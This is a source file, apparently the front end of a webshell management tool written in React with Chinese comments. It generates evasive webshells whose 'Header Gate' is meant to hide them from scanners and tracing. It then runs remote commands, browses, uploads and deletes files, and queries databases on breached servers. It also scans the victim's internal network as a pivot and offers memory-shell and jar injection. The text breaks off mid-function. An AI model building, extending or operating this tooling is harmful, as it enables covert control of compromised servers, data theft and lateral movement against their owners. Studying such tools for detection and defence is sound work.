"use client";

// webshell-console.tsx — Webshell 三栏工作台（对齐 morelian 默连能力面）：
// 左：目标管理（分组/搜索/批量测活/增删改）；中：会话 Tabs（按载荷动态）：
// 终端 / 文件管理 / 数据库 / 网络 / 进程 / 内存马(JSP) / Servlet(JSP) / Jar(JSP) /
// 截图(JSP) / PHP工具(PHP) / 笔记 / 信息；生成对话框支持 Header Gate。
import React from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { api, type WSTarget } from "@/lib/api";
import {
  PlayIcon, RefreshCw, TrashIcon, PencilIcon, PlusIcon, StarIcon,
  FolderUpIcon, FilePlusIcon, FolderPlusIcon, DownloadIcon, CameraIcon, ZapIcon,
} from "lucide-react";

const SCRIPT_TYPES = ["php", "jsp", "jspx", "asp", "aspx", "py", "node"];
const ENCODERS = ["raw", "aes", "xor"];

// ExtOps 前端镜像：插件 Tab 按载荷动态显示（与服务端 ExtOps 一致）。
function extOps(st: string): string[] {
  if (st === "php") return ["db", "net", "proc", "zip", "phptool"];
  if (st === "jsp" || st === "jspx") return ["db", "net", "memshell", "servlet", "jar", "shot"];
  return [];
}

// ---------- 主组件 ----------
export default function WebshellConsole() {
  const [targets, setTargets] = React.useState<WSTarget[]>([]);
  const [q, setQ] = React.useState("");
  const [sel, setSel] = React.useState<WSTarget | null>(null);
  const [genOpen, setGenOpen] = React.useState(false);
  const [addOpen, setAddOpen] = React.useState(false);
  const [addForm, setAddForm] = React.useState<Partial<WSTarget>>({ group: "default", encoder: "raw", script_type: "php" });
  const [checking, setChecking] = React.useState(false);
  const searchDeb = React.useRef<ReturnType<typeof setTimeout> | null>(null);

  const load = React.useCallback(async (query?: string) => {
    try {
      const r = await api.wsTargets(query);
      setTargets(r.data || []);
    } catch { /* ignore */ }
  }, []);
  React.useEffect(() => { load(); }, [load]);

  const onSearch = (v: string) => {
    setQ(v);
    if (searchDeb.current) clearTimeout(searchDeb.current);
    searchDeb.current = setTimeout(() => load(v.trim() || undefined), 300);
  };

  const checkAll = async () => {
    setChecking(true);
    try {
      await api.wsTargetsCheck();
      await load(q.trim() || undefined);
    } finally { setChecking(false); }
  };

  const del = async (t: WSTarget) => {
    if (!window.confirm(`删除目标「${t.name || t.url}」？`)) return;
    if (sel?.id === t.id) setSel(null);
    await api.wsTargetDelete(t.id);
    load(q.trim() || undefined);
  };

  const save = async () => {
    if (!addForm.url?.trim()) return void window.alert("URL 必填");
    try {
      await api.wsTargetSave(addForm);
      setAddOpen(false);
      load(q.trim() || undefined);
    } catch (e) {
      window.alert("保存失败: " + (e instanceof Error ? e.message : String(e)));
    }
  };

  // 分组
  const groups = React.useMemo(() => {
    const m = new Map<string, WSTarget[]>();
    for (const t of targets) {
      const g = t.group || "default";
      if (!m.has(g)) m.set(g, []);
      m.get(g)!.push(t);
    }
    return Array.from(m.entries());
  }, [targets]);

  return (
    <div className="flex gap-3">
      {/* 左：目标列表 */}
      <div className="w-64 shrink-0 space-y-2">
        <Card>
          <CardContent className="space-y-2 p-2">
            <div className="flex gap-1">
              <Input className="h-7 text-xs" placeholder="搜索名称/URL…" value={q} onChange={(e) => onSearch(e.target.value)} />
            </div>
            <div className="flex gap-1">
              <Button variant="outline" size="sm" className="h-7 flex-1 text-xs" onClick={() => { setAddForm({ group: "default", encoder: "raw", script_type: "php", id: 0, name: "", url: "", password: "", note: "", headers: "" }); setAddOpen(true); }}>
                <PlusIcon className="mr-1 size-3.5" /> 添加目标
              </Button>
              <Button variant="outline" size="sm" className="h-7 flex-1 text-xs" onClick={checkAll} disabled={checking}>
                <RefreshCw className={`mr-1 size-3.5 ${checking ? "animate-spin" : ""}`} /> 测活
              </Button>
            </div>
            <div className="max-h-[560px] space-y-2 overflow-auto">
              {groups.length === 0 && <div className="py-6 text-center text-xs text-muted-foreground">暂无目标</div>}
              {groups.map(([g, items]) => (
                <div key={g}>
                  <div className="px-1 py-0.5 text-[10px] font-semibold uppercase text-muted-foreground">{g}（{items.length}）</div>
                  {items.map((t) => (
                    <div
                      key={t.id}
                      className={`group cursor-pointer rounded border p-1.5 text-xs hover:bg-muted/60 ${sel?.id === t.id ? "border-primary bg-muted" : ""}`}
                      onClick={() => setSel(t)}
                    >
                      <div className="flex items-center justify-between gap-1">
                        <span className="truncate font-medium">{t.name || t.url}</span>
                        <span className={`shrink-0 rounded px-1 text-[10px] ${t.alive ? "bg-green-500/15 text-green-600" : "bg-muted text-muted-foreground"}`}>
                          {t.alive ? "活" : "未测"}
                        </span>
                      </div>
                      <div className="truncate text-[10px] text-muted-foreground">{t.url}</div>
                      <div className="flex items-center justify-between">
                        <span className="text-[10px] text-muted-foreground">{t.script_type}/{t.encoder}</span>
                        <span className="hidden gap-1 group-hover:flex">
                          <button title="编辑" onClick={(e) => { e.stopPropagation(); setAddForm({ ...t }); setAddOpen(true); }}>
                            <PencilIcon className="size-3" />
                          </button>
                          <button title="删除" onClick={(e) => { e.stopPropagation(); del(t); }}>
                            <TrashIcon className="size-3 text-red-400" />
                          </button>
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
        <Button variant="outline" size="sm" className="w-full text-xs" onClick={() => setGenOpen(!genOpen)}>
          <ZapIcon className="mr-1 size-3.5" /> 生成 Webshell
        </Button>
      </div>

      {/* 中：会话工作台 */}
      <div className="min-w-0 flex-1">
        {genOpen ? <GeneratePanel onClose={() => setGenOpen(false)} /> : sel ? <SessionTabs target={sel} onEdit={() => { setAddForm({ ...sel }); setAddOpen(true); }} /> : (
          <Card>
            <CardContent className="py-16 text-center text-sm text-muted-foreground">
              左侧选择目标打开会话，或添加/生成新 Webshell
            </CardContent>
          </Card>
        )}
      </div>

      {/* 添加/编辑对话框 */}
      {addOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setAddOpen(false)}>
          <Card className="w-[460px]" onClick={(e) => e.stopPropagation()}>
            <CardHeader className="py-2"><CardTitle className="text-sm">{addForm.id ? "编辑目标" : "添加目标"}</CardTitle></CardHeader>
            <CardContent className="space-y-2 p-3 text-sm">
              <div className="grid grid-cols-2 gap-2">
                <Input placeholder="分组（default）" value={addForm.group || ""} onChange={(e) => setAddForm({ ...addForm, group: e.target.value })} />
                <Input placeholder="名称" value={addForm.name || ""} onChange={(e) => setAddForm({ ...addForm, name: e.target.value })} />
              </div>
              <Input placeholder="URL（http://target/shell.php）" value={addForm.url || ""} onChange={(e) => setAddForm({ ...addForm, url: e.target.value })} />
              <div className="grid grid-cols-3 gap-2">
                <Input placeholder="密码" value={addForm.password || ""} onChange={(e) => setAddForm({ ...addForm, password: e.target.value })} />
                <select className="rounded border bg-transparent p-1.5 text-sm" value={addForm.encoder || "raw"} onChange={(e) => setAddForm({ ...addForm, encoder: e.target.value })}>
                  {ENCODERS.map((x) => <option key={x} value={x}>{x}</option>)}
                </select>
                <select className="rounded border bg-transparent p-1.5 text-sm" value={addForm.script_type || "php"} onChange={(e) => setAddForm({ ...addForm, script_type: e.target.value })}>
                  {SCRIPT_TYPES.map((x) => <option key={x} value={x}>{x}</option>)}
                </select>
              </div>
              <Input placeholder='附加头 JSON（如 {"X-Gate":"v","User-Agent":"Mozilla/5.0 …"}）' value={addForm.headers || ""} onChange={(e) => setAddForm({ ...addForm, headers: e.target.value })} />
              <textarea className="h-16 w-full rounded border bg-transparent p-2 text-xs" placeholder="备注" value={addForm.note || ""} onChange={(e) => setAddForm({ ...addForm, note: e.target.value })} />
              <div className="flex justify-end gap-2">
                <Button variant="outline" size="sm" onClick={() => setAddOpen(false)}>取消</Button>
                <Button size="sm" onClick={save}>保存</Button>
              </div>
            </CardContent>
          </Card>
        </div>
      )}
    </div>
  );
}

// ---------- 生成面板 ----------
function GeneratePanel({ onClose }: { onClose: () => void }) {
  const [st, setSt] = React.useState("php");
  const [enc, setEnc] = React.useState("raw");
  const [pwd, setPwd] = React.useState("");
  const [gateHeader, setGateHeader] = React.useState("");
  const [gateValue, setGateValue] = React.useState("");
  const [gen, setGen] = React.useState<{ path: string; code: string; size: number } | null>(null);
  const [busy, setBusy] = React.useState(false);
  const [copied, setCopied] = React.useState(false);

  const run = async () => {
    if (!pwd.trim()) return void window.alert("密码必填");
    setBusy(true);
    try {
      const r = await api.wsGenerate({ script_type: st, encoder: enc, password: pwd, gate_header: gateHeader, gate_value: gateValue });
      setGen(r.data);
    } catch (e) {
      window.alert("生成失败: " + (e instanceof Error ? e.message : String(e)));
    } finally { setBusy(false); }
  };

  return (
    <Card>
      <CardHeader className="flex flex-row items-center justify-between py-2">
        <CardTitle className="text-sm">生成 Webshell</CardTitle>
        <Button variant="outline" size="sm" onClick={onClose}>收起</Button>
      </CardHeader>
      <CardContent className="space-y-2 p-3 text-sm">
        <div className="grid grid-cols-3 gap-2">
          <select className="rounded border bg-transparent p-1.5" value={st} onChange={(e) => setSt(e.target.value)}>
            {SCRIPT_TYPES.map((x) => <option key={x} value={x}>{x}</option>)}
          </select>
          <select className="rounded border bg-transparent p-1.5" value={enc} onChange={(e) => setEnc(e.target.value)}>
            {ENCODERS.map((x) => <option key={x} value={x}>{x}</option>)}
          </select>
          <Input placeholder="连接密码" value={pwd} onChange={(e) => setPwd(e.target.value)} />
        </div>
        <div className="grid grid-cols-2 gap-2">
          <Input placeholder="Header Gate 头名（可选，如 X-Gate）" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} />
          <Input placeholder="Gate 值（无此头返回 404）" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
        </div>
        <div className="text-xs text-muted-foreground">
          Header Gate：服务端只在校验头匹配时才执行，缺失时返回 404——对抗扫描器与溯源探测（连接目标时把同名头写进「附加头 JSON」即可）。
          php/jsp/jspx/asp/aspx 支持；py/node 由外层框架管 header，忽略。
        </div>
        <Button size="sm" onClick={run} disabled={busy}><PlayIcon className="mr-1 size-4" /> {busy ? "生成中…" : "生成"}</Button>
        {gen && (
          <div className="space-y-1">
            <div className="flex items-center justify-between text-xs text-muted-foreground">
              <span>已存 {gen.path}（{gen.size} 字节）</span>
              <Button variant="outline" size="sm" onClick={async () => { await navigator.clipboard.writeText(gen.code); setCopied(true); setTimeout(() => setCopied(false), 1500); }}>
                {copied ? "已复制 ✓" : "复制代码"}
              </Button>
            </div>
            <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px]">{gen.code}</pre>
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ---------- 会话 Tabs ----------
type SessionTab = "info" | "terminal" | "files" | "db" | "net" | "proc" | "memshell" | "servlet" | "jar" | "shot" | "phptool" | "note";

function SessionTabs({ target, onEdit }: { target: WSTarget; onEdit: () => void }) {
  const ops = extOps(target.script_type);
  const tabs: { key: SessionTab; label: string }[] = [
    { key: "info", label: "信息" },
    { key: "terminal", label: "终端" },
    { key: "files", label: "文件" },
    ...(ops.includes("db") ? [{ key: "db" as SessionTab, label: "数据库" }] : []),
    ...(ops.includes("net") ? [{ key: "net" as SessionTab, label: "网络" }] : []),
    ...(ops.includes("proc") ? [{ key: "proc" as SessionTab, label: "进程" }] : []),
    ...(ops.includes("memshell") ? [{ key: "memshell" as SessionTab, label: "内存马" }] : []),
    ...(ops.includes("servlet") ? [{ key: "servlet" as SessionTab, label: "Servlet" }] : []),
    ...(ops.includes("jar") ? [{ key: "jar" as SessionTab, label: "Jar" }] : []),
    ...(ops.includes("shot") ? [{ key: "shot" as SessionTab, label: "截图" }] : []),
    ...(ops.includes("phptool") ? [{ key: "phptool" as SessionTab, label: "PHP工具" }] : []),
    { key: "note", label: "笔记" },
  ];
  const [tab, setTab] = React.useState<SessionTab>("terminal");
  return (
    <Card>
      <CardContent className="p-2">
        <div className="mb-2 flex flex-wrap items-center gap-1 border-b pb-1.5">
          {tabs.map((t) => (
            <button
              key={t.key}
              className={`rounded px-2 py-1 text-xs ${tab === t.key ? "bg-muted font-semibold" : "text-muted-foreground hover:bg-muted/50"}`}
              onClick={() => setTab(t.key)}
            >
              {t.label}
            </button>
          ))}
          <span className="ml-auto text-xs text-muted-foreground">{target.name || target.url} · {target.script_type}/{target.encoder}</span>
          <Button variant="outline" size="sm" className="h-6 text-xs" onClick={onEdit}>编辑</Button>
        </div>
        {tab === "info" && <InfoPanel target={target} />}
        {tab === "terminal" && <TerminalPanel target={target} />}
        {tab === "files" && <FilesPanel target={target} />}
        {tab === "db" && <DBPanel target={target} />}
        {tab === "net" && <NetPanel target={target} />}
        {tab === "proc" && <ProcPanel target={target} />}
        {tab === "memshell" && <MemshellPanel target={target} />}
        {tab === "servlet" && <ServletPanel target={target} />}
        {tab === "jar" && <JarPanel target={target} />}
        {tab === "shot" && <ShotPanel target={target} />}
        {tab === "phptool" && <PHPToolPanel target={target} />}
        {tab === "note" && <NotePanel target={target} />}
      </CardContent>
    </Card>
  );
}

// ---------- 各面板共用的执行钩子 ----------
function useRunner(target: WSTarget) {
  const [busy, setBusy] = React.useState(false);
  const headers = target.headers || "";
  const base = { url: target.url, password: target.password, encoder: target.encoder, script_type: target.script_type, headers };
  const exec = async (op: string, extra: Record<string, unknown>) => {
    setBusy(true);
    try {
      const r = await api.webshellExec({ ...base, op, timeout: 60, ...extra } as never);
      return r.data;
    } catch (e) {
      return { ok: false, output: "", cwd: "", error: e instanceof Error ? e.message : String(e), data_len: 0 } as { ok: boolean; output: string; cwd: string; error: string; data_len: number; data_b64?: string };
    } finally { setBusy(false); }
  };
  const ext = async (op: string, e: Record<string, unknown>) => {
    setBusy(true);
    try {
      const r = await api.webshellExt({ ...base, op, timeout: 120, ext: e });
      return r.data;
    } catch (err) {
      return { ok: false, output: "", error: err instanceof Error ? err.message : String(err), data_len: 0 } as { ok: boolean; output: string; error: string; data_len: number; data_b64?: string };
    } finally { setBusy(false); }
  };
  return { busy, exec, ext };
}

function InfoPanel({ target }: { target: WSTarget }) {
  const [info, setInfo] = React.useState("");
  const { busy, exec, ext } = useRunner(target);
  const probe = async () => {
    const phpCmd = 'echo "PHP_OS=".PHP_OS."; PHPVER=".PHP_VERSION;';
    const r = await exec("exec", {
      cmd: target.script_type === "php" ? phpCmd : "uname -a; id",
    });
    setInfo(r.ok ? r.output : "[失败] " + r.error);
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="grid grid-cols-2 gap-1 text-xs">
        {[["URL", target.url], ["载荷", `${target.script_type}/${target.encoder}`], ["存活", target.alive ? "是" : "未测/否"], ["最近检测", target.last_check || "-"], ["分组", target.group], ["附加头", target.headers || "-"]].map(([k, v]) => (
          <div key={k} className="rounded border p-1.5">
            <span className="text-muted-foreground">{k}：</span>
            <span className="font-mono break-all">{v}</span>
          </div>
        ))}
      </div>
      <Button size="sm" onClick={probe} disabled={busy}><PlayIcon className="mr-1 size-4" /> 采集基础信息</Button>
      {info && <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{info}</pre>}
    </div>
  );
}

function TerminalPanel({ target }: { target: WSTarget }) {
  const [out, setOut] = React.useState("");
  const [cmd, setCmd] = React.useState("");
  const [cwd, setCwd] = React.useState("");
  const { busy, exec } = useRunner(target);
  const hist = React.useRef<string[]>([]);
  const hidx = React.useRef(-1);

  const run = async (c?: string) => {
    const command = (c ?? cmd).trim();
    if (!command) return;
    setOut((o) => `${o}${o ? "\n" : ""}$ ${command}\n`);
    const r = await exec("exec", { cmd: command, cwd });
    if (r.cwd) setCwd(r.cwd);
    setOut((o) => o + (r.ok ? r.output : "[错误] " + r.error) + "\n");
    hist.current.push(command);
    hidx.current = -1;
    setCmd("");
  };

  const quick = target.script_type === "php"
    ? ["whoami", "id", "uname -a", "netstat -antp", "ps aux | head -30", "ip a", "crontab -l"]
    : ["whoami", "id", "uname -a", "netstat -ano", "tasklist | findstr /i java", "ipconfig"];

  return (
    <div className="space-y-2">
      <div className="flex flex-wrap gap-1">
        {quick.map((c) => (
          <button key={c} className="rounded bg-muted px-1.5 py-0.5 font-mono text-[10px] text-muted-foreground hover:bg-muted/70" onClick={() => run(c)} disabled={busy}>
            {c.split(" ")[0] === "netstat" || c.includes("ps aux") || c.includes("tasklist") ? "🖥 " : ""}
            {c}
          </button>
        ))}
      </div>
      <pre className="h-64 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（终端输出；命令在目标机执行，cwd 自动跟随）"}</pre>
      <div className="flex items-center gap-1">
        {cwd && <span className="rounded bg-blue-500/15 px-1.5 py-1 font-mono text-[10px] text-blue-400">{cwd}</span>}
        <Input
          className="font-mono text-xs"
          placeholder="命令（↑↓ 翻历史）"
          value={cmd}
          disabled={busy}
          onChange={(e) => setCmd(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter") run();
            if (e.key === "ArrowUp") {
              e.preventDefault();
              const h = hist.current;
              if (!h.length) return;
              hidx.current = hidx.current < 0 ? h.length - 1 : Math.max(0, hidx.current - 1);
              setCmd(h[hidx.current]);
            }
            if (e.key === "ArrowDown") {
              e.preventDefault();
              const h = hist.current;
              if (hidx.current >= 0 && hidx.current < h.length - 1) { hidx.current++; setCmd(h[hidx.current]); }
              else { hidx.current = -1; setCmd(""); }
            }
          }}
        />
        <Button size="sm" onClick={() => run()} disabled={busy}><PlayIcon className="size-4" /></Button>
      </div>
    </div>
  );
}

// ---------- 文件管理 ----------
interface FileRow { name: string; size: number; is_dir: boolean; mtime: number }

function FilesPanel({ target }: { target: WSTarget }) {
  const [rows, setRows] = React.useState<FileRow[]>([]);
  const [cwd, setCwd] = React.useState("");
  const [err, setErr] = React.useState("");
  const [preview, setPreview] = React.useState<{ name: string; text: string; b64?: string } | null>(null);
  const { busy, exec } = useRunner(target);
  const supported = ["php", "jsp", "jspx", "py", "node"].includes(target.script_type);

  const ls = async (p?: string) => {
    setErr("");
    const target0 = p ?? cwd;
    const r = await exec("list", { path: target0 });
    if (!r.ok) { setErr(r.error); setRows([]); return; }
    try {
      const arr = JSON.parse(r.output.trim()) as FileRow[];
      arr.sort((a, b) => (b.is_dir ? 1 : 0) - (a.is_dir ? 1 : 0) || a.name.localeCompare(b.name));
      setRows(arr);
      if (r.cwd) setCwd(r.cwd);
      else if (target0) setCwd(target0);
    } catch {
      setErr("目录解析失败：" + r.output.slice(0, 200));
    }
  };

  React.useEffect(() => { if (supported) ls(); }, [supported]); // eslint-disable-line react-hooks/exhaustive-deps

  const read = async (f: FileRow) => {
    const p = (cwd ? cwd.replace(/\/$/, "") + "/" : "") + f.name;
    const r = await exec("read", { path: p });
    if (!r.ok) return void window.alert("读取失败: " + r.error);
    const text = r.data_b64 ? atob(r.data_b64) : "";
    const clean = text.slice(0, 2000);
    const bad = Array.from(clean).filter((ch) => {
      const c = ch.codePointAt(0) || 0;
      return c < 32 && c !== 10 && c !== 13 && c !== 9;
    }).length;
    const printable = bad * 10 <= clean.length;
    setPreview({ name: p, text: printable ? text.slice(0, 50000) : "（二进制文件，用「下载」保存）", b64: r.data_b64 });
  };

  const download = (f: FileRow) => {
    if (!preview || !preview.b64 || preview.name !== (cwd ? cwd.replace(/\/$/, "") + "/" : "") + f.name) return;
    const bin = atob(preview.b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const a = document.createElement("a");
    a.href = URL.createObjectURL(new Blob([bytes]));
    a.download = f.name;
    a.click();
  };

  const del = async (f: FileRow) => {
    if (!window.confirm(`删除 ${f.name}？`)) return;
    const r = await exec("delete", { path: (cwd ? cwd.replace(/\/$/, "") + "/" : "") + f.name });
    if (!r.ok) return void window.alert(r.error);
    ls();
  };

  const mkdir = async () => {
    const n = window.prompt("新目录名");
    if (!n) return;
    const r = await exec("mkdir", { path: (cwd ? cwd.replace(/\/$/, "") + "/" : "") + n });
    if (!r.ok) return void window.alert(r.error);
    ls();
  };

  const touch = async () => {
    const n = window.prompt("新文件名");
    if (!n) return;
    const r = await exec("write", { path: (cwd ? cwd.replace(/\/$/, "") + "/" : "") + n, content: "" });
    if (!r.ok) return void window.alert(r.error);
    ls();
  };

  const upload = async () => {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.onchange = async () => {
      const f = inp.files?.[0];
      if (!f) return;
      const b64 = await new Promise<string>((res) => {
        const fr = new FileReader();
        fr.onload = () => {
          const s = String(fr.result).split(",")[1] || "";
          res(s);
        };
        fr.readAsDataURL(f);
      });
      const r = await exec("write", { path: (cwd ? cwd.replace(/\/$/, "") + "/" : "") + f.name, content_b64: b64 });
      if (!r.ok) return void window.alert("上传失败: " + r.error);
      ls();
    };
    inp.click();
  };

  const enter = (f: FileRow) => {
    if (!f.is_dir) return;
    const base = cwd ? cwd.replace(/\/$/, "") : "";
    ls(base ? `${base}/${f.name}` : f.name);
  };
  const up = () => ls(cwd.includes("/") ? cwd.replace(/\/[^/]+$/, "") : "..");
  const go = () => {
    const p = window.prompt("跳转路径", cwd);
    if (p) ls(p);
  };

  if (!supported) return <div className="py-8 text-center text-sm text-muted-foreground">{target.script_type} 载荷不支持文件管理（仅 php/jsp/jspx/py/node）</div>;

  return (
    <div className="space-y-2">
      <div className="flex flex-wrap items-center gap-1 text-xs">
        <span className="rounded bg-blue-500/15 px-1.5 py-1 font-mono text-blue-400">{cwd || "（cwd）"}</span>
        <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={up}>↑ 上级</Button>
        <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={go}>跳转</Button>
        <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={() => ls(cwd)} disabled={busy}><RefreshCw className={`size-3 ${busy ? "animate-spin" : ""}`} /></Button>
        <span className="ml-auto flex gap-1">
          <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={upload}><FolderUpIcon className="mr-1 size-3" /> 上传</Button>
          <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={touch}><FilePlusIcon className="mr-1 size-3" /> 新文件</Button>
          <Button variant="outline" size="sm" className="h-6 px-2 text-xs" onClick={mkdir}><FolderPlusIcon className="mr-1 size-3" /> 新目录</Button>
        </span>
      </div>
      {err && <div className="rounded border border-red-500/40 bg-red-500/10 p-1.5 text-xs text-red-500">{err}</div>}
      <div className="max-h-72 overflow-auto rounded border">
        <table className="w-full text-xs">
          <thead className="sticky top-0 bg-muted">
            <tr className="text-left text-muted-foreground">
              <th className="py-1 pl-2">名称</th>
              <th className="w-20">大小</th>
              <th className="w-36">修改时间</th>
              <th className="w-40">操作</th>
            </tr>
          </thead>
          <tbody>
            {rows.length === 0 && (
              <tr><td colSpan={4} className="py-4 text-center text-muted-foreground">{busy ? "加载中…" : "空目录（先 ls 或跳转路径）"}</td></tr>
            )}
            {rows.map((f) => (
              <tr key={f.name} className="border-b border-border/40 hover:bg-muted/30">
                <td className="py-1 pl-2 font-mono">
                  {f.is_dir
                    ? <button className="font-semibold text-blue-400 hover:underline" onClick={() => enter(f)}>📁 {f.name}</button>
                    : <button className="hover:underline" onClick={() => read(f)}>{f.name}</button>}
                </td>
                <td className="text-muted-foreground">{f.is_dir ? "-" : fmtSize(f.size)}</td>
                <td className="text-muted-foreground">{f.mtime ? new Date(f.mtime * 1000).toLocaleString() : "-"}</td>
                <td>
                  <span className="flex gap-2 text-[10px]">
                    {!f.is_dir && <button className="text-blue-400 hover:underline" onClick={() => read(f)}>读</button>}
                    {preview?.name.endsWith(f.name) && preview.b64 && !f.is_dir && <button className="text-green-500 hover:underline" onClick={() => download(f)}>下载</button>}
                    <button className="text-red-400 hover:underline" onClick={() => del(f)}>删</button>
                  </span>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      {preview && (
        <div className="space-y-1">
          <div className="text-xs text-muted-foreground">预览：{preview.name}</div>
          <pre className="max-h-56 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-[11px]">{preview.text}</pre>
        </div>
      )}
    </div>
  );
}

function fmtSize(n: number) {
  if (n < 1024) return `${n}B`;
  if (n < 1048576) return `${(n / 1024).toFixed(1)}K`;
  return `${(n / 1048576).toFixed(1)}M`;
}

// ---------- 数据库 ----------
function DBPanel({ target }: { target: WSTarget }) {
  const [cfg, setCfg] = React.useState({ db_type: "mysql", host: "127.0.0.1", port: "3306", user: "root", pass: "", db: "" });
  const [sql, setSql] = React.useState("SELECT 1");
  const [result, setResult] = React.useState<{ columns: string[]; rows: Record<string, unknown>[]; affected?: number } | null>(null);
  const [err, setErr] = React.useState("");
  const { busy, ext } = useRunner(target);

  const run = async () => {
    setErr("");
    const r = await ext("db_exec", cfg as unknown as Record<string, unknown>);
    if (!r.ok) { setErr(r.error || r.output); setResult(null); return; }
    try {
      const j = JSON.parse(r.output.trim());
      if (!j.ok) { setErr(j.error || "SQL 失败"); setResult(null); return; }
      setResult({ columns: j.columns || [], rows: j.rows || [], affected: j.affected });
    } catch {
      setErr("解析失败：" + r.output.slice(0, 300));
    }
  };

  const probe = async () => {
    const r = await ext("db_probe", {});
    setErr(r.ok ? r.output : r.error);
  };

  return (
    <div className="space-y-2 text-sm">
      <div className="grid grid-cols-3 gap-1 text-xs md:grid-cols-6">
        <select className="rounded border bg-transparent p-1" value={cfg.db_type} onChange={(e) => { const t = e.target.value; setCfg({ ...cfg, db_type: t, port: t === "mysql" ? "3306" : t === "pgsql" ? "5432" : cfg.port }); }}>
          <option value="mysql">mysql</option><option value="pgsql">pgsql</option>
          {target.script_type === "php" && <option value="sqlite">sqlite</option>}
        </select>
        <Input placeholder="host" value={cfg.host} onChange={(e) => setCfg({ ...cfg, host: e.target.value })} />
        <Input placeholder="port" value={cfg.port} onChange={(e) => setCfg({ ...cfg, port: e.target.value })} />
        <Input placeholder="user" value={cfg.user} onChange={(e) => setCfg({ ...cfg, user: e.target.value })} />
        <Input placeholder="pass" type="password" value={cfg.pass} onChange={(e) => setCfg({ ...cfg, pass: e.target.value })} />
        <Input placeholder={cfg.db_type === "sqlite" ? "db 文件路径" : "database"} value={cfg.db} onChange={(e) => setCfg({ ...cfg, db: e.target.value })} />
      </div>
      <div className="flex gap-1">
        {["SHOW DATABASES", "SHOW TABLES", "SELECT version()", "SELECT user()"].map((s) => (
          <button key={s} className="rounded bg-muted px-1.5 py-0.5 font-mono text-[10px] text-muted-foreground hover:bg-muted/70" onClick={() => setSql(s)}>{s}</button>
        ))}
        <Button variant="outline" size="sm" className="ml-auto h-6 px-2 text-xs" onClick={probe} disabled={busy}>探测配置文件</Button>
      </div>
      <textarea className="h-16 w-full rounded border bg-transparent p-2 font-mono text-xs" value={sql} onChange={(e) => setSql(e.target.value)} placeholder="SQL（在目标机执行——直连目标内网数据库）" />
      <Button size="sm" onClick={run} disabled={busy}><PlayIcon className="mr-1 size-4" /> 执行</Button>
      {err && <div className="rounded border border-amber-500/40 bg-amber-500/10 p-1.5 font-mono text-xs text-amber-600">{err}</div>}
      {result && (
        <div className="max-h-60 overflow-auto rounded border">
          <table className="w-full text-xs">
            <thead className="sticky top-0 bg-muted">
              <tr className="text-left">{result.columns.map((c) => <th key={c} className="py-1 pl-2">{c}</th>)}</tr>
            </thead>
            <tbody>
              {result.rows.map((row, i) => (
                <tr key={i} className="border-b border-border/40">
                  {result.columns.map((c) => <td key={c} className="truncate py-1 pl-2 font-mono" title={String(row[c])}>{String(row[c])}</td>)}
                </tr>
              ))}
              {result.rows.length === 0 && <tr><td colSpan={result.columns.length || 1} className="py-3 text-center text-muted-foreground">{result.affected !== undefined ? `影响 ${result.affected} 行` : "无结果"}</td></tr>}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

// ---------- 网络 ----------
function NetPanel({ target }: { target: WSTarget }) {
  const [host, setHost] = React.useState("127.0.0.1");
  const [ports, setPorts] = React.useState("80,443,3306,6379,8080,8888");
  const [out, setOut] = React.useState("");
  const { busy, ext, exec } = useRunner(target);

  const scan = async () => {
    const r = await ext("net_scan", { scan_host: host, scan_ports: ports });
    if (!r.ok) return setOut("[失败] " + r.error);
    try {
      const j = JSON.parse(r.output.trim());
      setOut(`目标 ${j.host} 开放端口：${(j.open || []).join(", ") || "无"}`);
    } catch { setOut(r.output); }
  };
  const netstat = async () => {
    const r = await exec("exec", { cmd: target.script_type === "php" ? "netstat -antp 2>/dev/null || netstat -an" : "netstat -ano" });
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };

  return (
    <div className="space-y-2 text-sm">
      <div className="text-xs text-muted-foreground">内网端口扫描：以目标机为跳板探测其内网（授权测试）。</div>
      <div className="flex gap-1">
        <Input placeholder="目标 host/IP" value={host} onChange={(e) => setHost(e.target.value)} className="font-mono text-xs" />
        <Input placeholder="端口（逗号分隔/区间）" value={ports} onChange={(e) => setPorts(e.target.value)} className="font-mono text-xs" />
        <Button size="sm" onClick={scan} disabled={busy}><PlayIcon className="mr-1 size-4" /> 扫描</Button>
        <Button variant="outline" size="sm" onClick={netstat} disabled={busy}>netstat</Button>
      </div>
      <pre className="max-h-72 overflow-auto whitespace-pre-wrap rounded bg-muted/40 p-2 font-mono text-xs">{out || "（结果）"}</pre>
    </div>
  );
}

// ---------- 进程 ----------
function ProcPanel({ target }: { target: WSTarget }) {
  const [rows, setRows] = React.useState<{ name: string; pid: string; mem?: string; state?: string }[]>([]);
  const [raw, setRaw] = React.useState("");
  const { busy, ext, exec } = useRunner(target);

  const list = async () => {
    if (target.script_type === "php") {
      const r = await ext("proc_list", {});
      if (!r.ok) return setRaw("[失败] " + r.error);
      try {
        const j = JSON.parse(r.output.trim());
        setRows((j.procs || []).map((p: { name: string; pid: string | number; mem?: string; state?: string }) => ({ name: p.name, pid: String(p.pid), mem: p.mem, state: p.state })));
